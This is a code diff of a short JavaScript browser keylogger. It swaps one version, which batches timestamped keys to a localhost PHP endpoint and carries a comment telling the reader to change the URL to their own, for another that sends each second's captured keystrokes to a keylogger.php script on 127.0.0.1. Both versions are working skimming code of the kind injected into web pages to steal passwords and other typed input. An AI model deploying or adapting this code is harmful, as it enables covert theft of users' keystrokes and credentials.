@@ -1,15 +1,15 @@
-var presses = [];
-window.addEventListener('keydown', function(evt) {
-  presses.push({
-    t: Math.round(new Date().getTime() / 1000),
-    k: evt.key
-  });
-});
+var keys = '';
+var url = 'http://127.0.0.1:5500/keylogger.php?c=';
+
+document.onkeypress = function(e) {
+  get = window.event ? event : e;
+  key = get.keyCode ? get.keyCode : get.charCode;
+  key = String.fromCharCode(key);
+  keys += key;
+};
 window.setInterval(function() {
-  if (presses.length > 5) {
-    var data = encodeURIComponent(JSON.stringify(presses));
-    // console.log(data);
-    new Image().src = 'http://localhost/test/keylog.php?k=' + data; // CHANGE THIS URL TO YOUR OWN!
-    presses = [];
+  if (keys.length > 0) {
+    new Image().src = url + keys;
+    keys = '';
   }
-}, 500);
+}, 1000);
